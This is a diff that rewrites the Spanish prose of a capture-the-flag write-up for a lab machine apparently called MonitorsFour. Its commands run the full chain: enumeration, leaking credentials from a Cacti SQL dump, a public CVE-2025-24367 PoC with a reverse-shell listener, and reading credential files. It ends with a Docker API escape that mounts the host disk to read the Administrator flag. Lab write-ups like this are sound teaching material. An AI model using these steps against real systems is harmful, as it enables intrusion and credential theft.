@@ -6,7 +6,8 @@ difficulty: Fácil
 operating_system: Windows
 service_hint: Cacti + CVE-2025-24367 + Docker API
 tags:
-  - CVE
+  - CVE-2025-24367
+  - CVE-2025-9074
   - Cacti
   - Docker API
   - RCE
@@ -25,15 +26,13 @@ summary: "Cadena de explotación: fuzzing de subdominios descubre Cacti 1.2.28, 
 
 ## Reconocimiento
 
-El objetivo inicial fue descubrir los servicios expuestos en la máquina Windows. Los puertos 80 (HTTP) y 5985 (WinRM) confirmaron que el vector de entrada pasaba por la web.
-
-Este primer escaneo localiza todos los puertos abiertos de forma rápida.
+Empezamos con un escaneo completo de puertos para descubrir los servicios expuestos en la máquina Windows. Queríamos identificar todos los puntos de entrada disponibles antes de profundizar.
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.1.174 -oG allPorts
 ```
 
-Con los puertos identificados, este segundo escaneo profundiza en versiones y banners de servicio.
+Con los puertos identificados, hicimos un escaneo más detallado con scripts de servicio para obtener versiones, banners y confirmar los fingerprints.
 
 ```bash
 nmap -p80,5985 -sCV 10.129.1.174 -oN targeted
@@ -46,21 +45,19 @@ Los indicadores clave de esta fase fueron:
 
 ## Enumeración
 
-Una vez agregado `monitorsfour.htb` al `/etc/hosts`, el siguiente paso fue identificar las tecnologías del sitio y buscar subdominios adicionales.
-
-Identificamos las tecnologías del sitio web con WhatWeb.
+Una vez agregado el dominio al `/etc/hosts`, identificamos las tecnologías del sitio con WhatWeb para saber con qué frameworks y servidores estamos tratando antes de profundizar en la enumeración.
 
 ```bash
 whatweb http://monitorsfour.htb/
 ```
 
-Feroxbuster enumera directorios y rutas dentro de la aplicación web.
+Fuzzeamos directorios con feroxbuster para descubrir rutas ocultas dentro de la aplicación web que no son accesibles desde la navegación normal.
 
 ```bash
 feroxbuster -u http://monitorsfour.htb -t 50
 ```
 
-Wfuzz fuerza subdominios para descubrir hosts virtuales adicionales.
+Buscamos subdominios adicionales con wfuzz, que fue clave para encontrar el panel de Cacti escondido y el resto de servicios virtuales del dominio.
 
 ```bash
 wfuzz -H "Host: FUZZ.monitorsfour.htb" --hc 404,403 -c --hh 138 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://monitorsfour.htb
@@ -70,13 +67,13 @@ El hallazgo crítico fue el subdominio `cacti.monitorsfour.htb`, que expone una 
 
 ![Panel de login de Cacti 1.2.28](/images/writeups/monitorsfour/Pasted image 20260521120236.png)
 
-Descargamos la base de datos SQL de Cacti para analizar su contenido en busca de usuarios y contraseñas.
+Descargamos el dump SQL de Cacti que está accesible públicamente desde la instalación. Los dumps de instalación suelen contener credenciales por defecto que podemos aprovechar si no fueron cambiadas.
 
 ```bash
 curl -s http://cacti.monitorsfour.htb/cacti/cacti.sql -o cacti.sql
 ```
 
-Buscamos sentencias de inserción de usuarios en el dump SQL.
+Buscamos en el dump las sentencias INSERT INTO user para encontrar los usuarios y sus hashes de contraseña. Así identificamos las cuentas predefinidas de Cacti.
 
 ```bash
 grep -i "INSERT INTO user" -n cacti.sql
@@ -86,7 +83,7 @@ Encontramos el hash MD5 del usuario `admin` (`21232f297a57a5a743894a0e4a801fc3`)
 
 ## Explotación
 
-Durante la enumeración web descubrimos un endpoint que filtra información de usuarios sin autenticación. Solicitamos el listado completo de usuarios con sus contraseñas hasheadas.
+Durante la enumeración web descubrimos un endpoint `/user?token=0` que filtra información de usuarios sin necesidad de autenticación. Consultamos el listado completo de usuarios para obtener nombres y roles.
 
 ```bash
 curl http://monitorsfour.htb/user?token=0
@@ -103,21 +100,19 @@ El endpoint devolvió los siguientes usuarios:
 
 El nombre real de `admin` era **Marcus Higgins**, lo que sugería que el usuario local `marcus` podía existir en el sistema. Probamos credenciales contra Cacti y el usuario `marcus` con contraseña `[REDACTED]` funcionó.
 
-Con acceso autenticado a Cacti 1.2.28, identificamos que es vulnerable a **CVE-2025-24367**, una vulnerabilidad de ejecución remota de comandos (RCE) autenticada. Clonamos el PoC disponible.
+Cacti 1.2.28 tiene una vulnerabilidad RCE autenticada conocida como CVE-2025-24367. Clonamos un PoC público para explotarla y obtener acceso al contenedor.
 
 ```bash
 git clone https://github.com/SoftAndoWetto/CVE-2025-24367-PoC-Cacti.git
 ```
 
-Ejecutamos el exploit proporcionando las credenciales de `marcus` y nuestra IP para la shell reversa.
+Con las credenciales de marcus apuntando a nuestra IP, ejecutamos el exploit para que suba un payload PHP mediante manipulación de plantillas y nos devuelva una shell reversa desde el contenedor Cacti.
 
 ```bash
 python3 exploit.py
 ```
 
-El exploit se conecta a Cacti, sube un payload PHP mediante la manipulación de plantillas y desencadena la shell reversa.
-
-Iniciamos un listener para recibir la conexión del contenedor víctima.
+Abrimos un listener en el puerto 4444 para recibir la shell reversa que el exploit va a disparar desde el contenedor Cacti.
 
 ```bash
 nc -nlvp 4444
@@ -130,7 +125,7 @@ bash: no job control in this shell
 www-data@821fbd6a43fa:~/html/cacti$
 ```
 
-Una vez dentro del contenedor, leemos el archivo de entorno de la aplicación para encontrar credenciales de base de datos.
+Una vez dentro del contenedor, buscamos credenciales en los archivos de configuración clave. Primero revisamos el `.env` de la aplicación, que suele contener credenciales de base de datos y otros secretos.
 
 ```bash
 www-data@821fbd6a43fa:~/html/cacti$ cat /var/www/app/.env
@@ -141,7 +136,7 @@ DB_USER=monitorsdbuser
 DB_PASS=[REDACTED]
 ```
 
-También revisamos la configuración de Cacti para obtener las credenciales de la base de datos de Cacti.
+También revisamos los archivos de configuración de Cacti para encontrar las credenciales de su propia base de datos MySQL. Con la contraseña obtenida nos conectamos a MariaDB para explorar las tablas internas del sistema.
 
 ```bash
 www-data@821fbd6a43fa:~/html/cacti$ grep -Ei "user|pass|host|database|db_|mysql|mysqli|port" /var/www/html/cacti/include/config.php
@@ -185,7 +180,7 @@ www-data@821fbd6a43fa:~/html/cacti$ cat /home/marcus/user.txt
 
 ## Escalada de privilegios
 
-Desde el contenedor no tenemos acceso directo al sistema Windows host, pero podemos explorar la red interna Docker. Creamos un script para escanear el rango interno en busca de Docker API expuesto sin autenticación.
+Desde el contenedor no tenemos acceso directo al host Windows, pero podemos explorar la red interna de Docker. Creamos un script que escanea la subred 192.168.65.0/24 buscando la Docker API expuesta sin autenticación en el puerto 2375.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ cat << 'EOF' > scan.sh
@@ -198,7 +193,7 @@ done
 EOF
 ```
 
-Damos permisos de ejecución y lanzamos el escáner.
+Damos permisos de ejecución al script y lo lanzamos. Escanea toda la subred y encuentra la Docker API abierta sin autenticación en 192.168.65.7:2375.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ chmod +x scan.sh
@@ -206,7 +201,7 @@ www-data@821fbd6a43fa:/tmp$ ./scan.sh
 [+] Docker API OPEN: 192.168.65.7:2375
 ```
 
-El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticación. Esta exposición se debe al **CVE-2025-9074**, una vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a través de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creación de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imágenes disponibles.
+El host `192.168.65.7:2375` tiene la Docker API expuesta sin autenticación. Esta exposición se debe al **CVE-2025-9074**, una vulnerabilidad crítica (CVSS 9.3) en Docker Desktop que permite a cualquier contenedor Linux acceder al motor Docker a través de la subred interna `192.168.65.0/24` sin necesidad de montar el socket de Docker, posibilitando la creación de contenedores privilegiados que montan el sistema de archivos del host. Listamos las imágenes disponibles en el motor Docker para identificar qué contenedores existen y cuál podemos usar como base para montar el sistema de archivos del host.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
@@ -215,7 +210,7 @@ www-data@821fbd6a43fa:/tmp$ curl -s http://192.168.65.7:2375/images/json | grep 
 "RepoTags":["alpine:latest"]
 ```
 
-Creamos un payload JSON que monta el sistema de archivos del host dentro de un contenedor Alpine y lee la flag de Administrador.
+Preparamos un payload JSON que define un contenedor Alpine con el sistema de archivos del host montado en `/mnt/host_root`. El comando del contenedor lee directamente la flag de Administrador desde el disco montado.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ nano payload.json
@@ -233,32 +228,32 @@ www-data@821fbd6a43fa:/tmp$ nano payload.json
 }
 ```
 
-Iniciamos un servidor HTTP para transferir el payload desde nuestra máquina atacante.
+Levantamos un servidor HTTP en nuestra máquina atacante para que el contenedor víctima pueda descargar el payload JSON.
 
 ```bash
 python3 -m http.server 8000
 ```
 
-Descargamos el payload en la máquina víctima.
+Desde el contenedor víctima, descargamos el payload JSON usando curl apuntando a nuestro servidor HTTP atacante.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl http://10.10.14.150:8000/payload.json -o /tmp/payload.json
 ```
 
-Creamos un contenedor con el payload que monta el disco del host.
+Enviamos el payload JSON a la Docker API para crear un contenedor Alpine que monte el disco del host. La API nos devuelve el ID del contenedor creado, lo que confirma que el motor aceptó la solicitud.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl -X POST -H "Content-Type: application/json" -d @/tmp/payload.json http://192.168.65.7:2375/containers/create?name=pwned
 {"Id":"20dd4fc655bd666d5207249c937cbe951107cdd5b68b7f89e67feafe354731d4","Warnings":[]}
 ```
 
-Iniciamos el contenedor para ejecutar el comando.
+Iniciamos el contenedor con el endpoint `/start`. Al arrancar, ejecuta el comando que definimos en el payload: montar el disco del host y leer la flag de root.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl -X POST http://192.168.65.7:2375/containers/20dd4fc655bd/start
 ```
 
-Leemos los logs del contenedor para obtener la salida del comando, que contiene la flag de root.
+Consultamos los logs del contenedor con el endpoint `/logs`. La salida contiene la flag de root que el contenedor extrajo del sistema de archivos del host montado.
 
 ```bash
 www-data@821fbd6a43fa:/tmp$ curl http://192.168.65.7:2375/containers/20dd4fc655bd/logs?stdout=true
